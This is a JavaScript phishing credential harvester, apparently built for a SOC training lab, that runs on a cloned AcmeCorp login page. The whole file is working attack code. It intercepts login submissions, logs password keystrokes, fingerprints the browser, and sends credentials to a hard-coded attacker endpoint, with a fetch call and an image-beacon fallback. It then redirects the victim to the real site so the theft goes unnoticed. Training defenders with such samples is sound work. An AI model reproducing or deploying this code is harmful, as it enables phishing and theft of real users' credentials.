/**
 * Credential Harvester - Captures login form submissions and exfiltrates
 * credentials to the attacker-controlled endpoint.
 *
 * WARNING: This script is for educational and authorized SOC training purposes
 * only. Unauthorized use is illegal and unethical.
 *
 * This is served by the phishing-nginx Docker container alongside the cloned
 * AcmeCorp login page (index.html).
 */

(function () {
    "use strict";

    // Attacker endpoint configuration
    var ATTACKER_ENDPOINT = "https://203.0.113.50:8443/collect";
    var EXFIL_BEACON_URL  = "https://203.0.113.50:8443/beacon";
    var REDIRECT_URL      = "https://acmecorp.local/login?session_expired=1";

    /**
     * Gather browser fingerprint data for the attacker's records.
     */
    function collectFingerprint() {
        return {
            userAgent:  navigator.userAgent,
            language:   navigator.language,
            platform:   navigator.platform,
            screenRes:  screen.width + "x" + screen.height,
            timezone:   Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesOn:  navigator.cookieEnabled,
            timestamp:  new Date().toISOString(),
            referrer:   document.referrer || "direct",
            currentUrl: window.location.href
        };
    }

    /**
     * Send harvested credentials to the attacker's collection server.
     * Falls back to an image beacon if fetch() is unavailable.
     */
    function exfiltrateCredentials(data) {
        var payload = JSON.stringify(data);

        // Primary method: fetch API with keepalive
        if (typeof fetch === "function") {
            fetch(ATTACKER_ENDPOINT, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: payload,
                keepalive: true,
                mode: "no-cors"
            }).catch(function () {
                // Silently fail -- fallback below
                beaconFallback(payload);
            });
        } else {
            beaconFallback(payload);
        }
    }

    /**
     * Fallback exfiltration via image beacon (works even if fetch is blocked).
     */
    function beaconFallback(payload) {
        var encoded = encodeURIComponent(btoa(payload));
        var img = new Image();
        img.src = EXFIL_BEACON_URL + "?d=" + encoded + "&t=" + Date.now();
    }

    /**
     * Show loading overlay to keep the victim waiting while data is sent.
     */
    function showLoading() {
        var overlay = document.getElementById("loadingOverlay");
        if (overlay) {
            overlay.classList.add("active");
        }
    }

    /**
     * Redirect the victim to the real login page so they think the first
     * attempt failed (session expired). They re-enter credentials on the
     * real site and never suspect the phishing page.
     */
    function redirectToReal() {
        setTimeout(function () {
            window.location.href = REDIRECT_URL;
        }, 2500);
    }

    /**
     * Main form hijack handler.
     */
    function handleFormSubmit(event) {
        event.preventDefault();

        var usernameField = document.getElementById("username");
        var passwordField = document.getElementById("password");

        if (!usernameField || !passwordField) {
            return;
        }

        var harvestedData = {
            username:    usernameField.value,
            password:    passwordField.value,
            fingerprint: collectFingerprint(),
            source:      "phishing-portal-v2",
            campaignId:  "sc02-domain-spoof"
        };

        showLoading();
        exfiltrateCredentials(harvestedData);
        redirectToReal();
    }

    /**
     * Capture keystrokes in the password field (attacker wants partial
     * passwords even if the user does not click Submit).
     */
    var keystrokeBuffer = [];
    var keystrokeTimer  = null;

    function captureKeystrokes(event) {
        keystrokeBuffer.push({
            key:       event.key,
            timestamp: Date.now()
        });

        // Flush every 5 seconds of inactivity
        clearTimeout(keystrokeTimer);
        keystrokeTimer = setTimeout(function () {
            if (keystrokeBuffer.length > 0) {
                exfiltrateCredentials({
                    type:        "partial_keystrokes",
                    field:       "password",
                    keystrokes:  keystrokeBuffer,
                    fingerprint: collectFingerprint(),
                    campaignId:  "sc02-domain-spoof"
                });
                keystrokeBuffer = [];
            }
        }, 5000);
    }

    // --- Initialisation ---

    document.addEventListener("DOMContentLoaded", function () {
        var form = document.getElementById("loginForm");
        if (form) {
            form.addEventListener("submit", handleFormSubmit);
        }

        var pwField = document.getElementById("password");
        if (pwField) {
            pwField.addEventListener("keydown", captureKeystrokes);
        }

        // Beacon: notify attacker that a victim loaded the page
        exfiltrateCredentials({
            type:        "page_load",
            fingerprint: collectFingerprint(),
            campaignId:  "sc02-domain-spoof"
        });
    });
})();
